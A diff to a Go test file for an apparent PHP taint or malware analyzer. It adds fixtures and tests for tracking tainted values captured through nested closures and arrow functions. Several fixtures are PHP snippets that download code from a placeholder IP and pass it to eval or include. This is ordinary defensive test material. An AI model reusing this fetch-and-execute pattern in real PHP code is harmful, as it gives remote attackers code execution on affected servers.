@@ -911,6 +911,32 @@ add_action('init', function($payload) { include $payload; });`)
 	fxCaptureThenReassign = b64(`<?php
 $payload = file_get_contents('http://198.51.100.7/x');
 add_action('init', function() use ($payload) { $payload = 'safe.php'; include $payload; });`)
+
+	fxCaptureThroughArrow = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+$factory = fn() => function() use ($payload) { eval($payload); };`)
+
+	fxCaptureThroughNestedArrow = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+$factory = fn() => fn() => eval($payload);`)
+
+	fxFunctionCaptureThroughArrow = b64(`<?php
+function make_handler() {
+    $payload = file_get_contents('http://198.51.100.7/x');
+    return fn() => function() use ($payload) { eval($payload); };
+}`)
+
+	fxCaptureBlockedByArrowParam = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+$factory = fn($payload) => function() use ($payload) { include $payload; };`)
+
+	fxCaptureBlockedByClosure = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+$factory = function() { return fn() => include $payload; };`)
+
+	fxCaptureBlockedByFunction = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+function make_handler() { return fn() => eval($payload); }`)
 )
 
 // TestClosureCaptureOfTaintedValueIsRecorded pins the package's own contract:
@@ -979,5 +1005,50 @@ func TestCaptureThenReassignStaysClean(t *testing.T) {
 	}
 	if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
 		t.Fatalf("precision loss = %v, want the dropped capture still recorded", rep.PrecisionLoss)
+	}
+}
+
+// TestCapturePropagatesThroughArrowParents covers PHP's transitive implicit
+// capture rule. A nested closure's use() clause, or a nested arrow's direct
+// variable read, requires every enclosing arrow to capture that binding so it
+// is available when the nested declaration is created. Scope isolation must
+// not make that dropped outer value disappear from the precision marker.
+func TestCapturePropagatesThroughArrowParents(t *testing.T) {
+	for _, tc := range []struct{ name, fixture string }{
+		{"closure in arrow", fxCaptureThroughArrow},
+		{"arrow in arrow", fxCaptureThroughNestedArrow},
+		{"function-local through arrow", fxFunctionCaptureThroughArrow},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			rep := run(t, tc.fixture)
+			if len(rep.Results) != 0 {
+				t.Fatalf("results = %+v, want capture tracking not to change detection", rep.Results)
+			}
+			if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
+				t.Fatalf("precision loss = %v, want the transitive capture recorded", rep.PrecisionLoss)
+			}
+		})
+	}
+}
+
+// TestCaptureDoesNotCrossNonCapturingBindings makes the transitive rule stop
+// at real lexical boundaries. An arrow parameter supplies its own value, and
+// an ordinary closure receives no outer binding without use(), so neither
+// nested declaration captures the tainted top-level variable.
+func TestCaptureDoesNotCrossNonCapturingBindings(t *testing.T) {
+	for _, tc := range []struct{ name, fixture string }{
+		{"arrow parameter", fxCaptureBlockedByArrowParam},
+		{"ordinary closure", fxCaptureBlockedByClosure},
+		{"named function", fxCaptureBlockedByFunction},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			rep := run(t, tc.fixture)
+			if len(rep.Results) != 0 {
+				t.Fatalf("results = %+v, want none across a lexical boundary", rep.Results)
+			}
+			if slices.Contains(rep.PrecisionLoss, "closure-capture") {
+				t.Fatalf("precision loss = %v, want no transitive capture", rep.PrecisionLoss)
+			}
+		})
 	}
 }
